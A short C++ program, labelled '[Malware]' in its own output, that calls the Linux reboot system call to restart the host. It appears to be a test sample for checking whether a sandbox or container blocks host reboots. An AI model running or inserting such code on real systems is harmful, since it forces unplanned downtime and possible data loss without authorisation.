#include <iostream>
#include <linux/reboot.h>
#include <sys/reboot.h>
#include <unistd.h>
#include <cerrno>
#include <cstring>

int main() {
    std::cout << "[Malware] Attempting to REBOOT the host system..." << std::endl;
    
    int result = reboot(LINUX_REBOOT_CMD_RESTART);
    if (result == -1) {
        std::cerr << "[Malware] Failed to reboot: " << strerror(errno) << std::endl;
    } else {
        std::cout << "[Malware] Reboot successful? (You shouldn't see this)" << std::endl;
    }

    return 0;
}